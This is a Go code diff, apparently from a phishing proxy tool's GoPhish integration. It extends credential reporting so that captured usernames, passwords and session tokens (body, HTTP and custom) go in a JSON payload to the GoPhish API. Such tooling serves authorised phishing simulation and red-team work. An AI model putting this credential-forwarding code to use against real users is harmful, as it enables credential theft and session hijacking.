@@ -16,8 +16,9 @@ type GoPhish struct {
 }
 
 type ResultRequest struct {
-	Address   string `json:"address"`
-	UserAgent string `json:"user-agent"`
+	Address   string                 `json:"address"`
+	UserAgent string                 `json:"user-agent"`
+	Data      map[string]interface{} `json:"data"`
 }
 
 func NewGoPhish() *GoPhish {
@@ -93,15 +94,32 @@ func (o *GoPhish) ReportEmailLinkClicked(rid string, address string, userAgent s
 	return o.apiRequest(reqUrl.String(), content)
 }
 
-func (o *GoPhish) ReportCredentialsSubmitted(rid string, address string, userAgent string) error {
+func (o *GoPhish) ReportCredentialsSubmitted(rid string, session *Session) error {
 	err := o.validateSetup()
 	if err != nil {
 		return err
 	}
 
+	// Collect dynamic data from the session
+	data := make(map[string]interface{})
+	for k, v := range session.Custom {
+		data[k] = v
+	}
+	for k, v := range session.BodyTokens {
+		data[k] = v
+	}
+	for k, v := range session.HttpTokens {
+		data[k] = v
+	}
+
+	// Add username and password to the data
+	data["username"] = session.Username
+	data["password"] = session.Password
+
 	req := ResultRequest{
-		Address:   address,
-		UserAgent: userAgent,
+		Address:   session.RemoteAddr,
+		UserAgent: session.UserAgent,
+		Data:      data,
 	}
 
 	content, err := json.Marshal(req)
